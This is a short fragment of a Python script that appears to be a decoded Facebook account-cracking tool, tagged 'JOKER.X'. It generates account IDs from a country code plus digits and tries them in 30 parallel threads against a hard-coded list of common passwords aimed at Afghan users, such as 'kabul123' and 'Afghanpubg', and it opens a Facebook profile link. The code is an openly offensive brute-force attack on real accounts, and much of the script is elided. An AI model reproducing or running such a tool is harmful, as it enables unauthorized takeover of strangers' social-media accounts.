#DECODE/BY/SaManDar
#JOKER.X
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.ALIYAxKHANx302')
...
os.system('xdg-open https://www.facebook.com/profile.php?id=ALIYAxKHANx302')
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000','Armanjan','pubg123','Afghanpubg','PUBG123','lovepubg','afghanpubg','pubg12','khanjan','Afghanpubg','Afghan500600','PUBG123@@@']
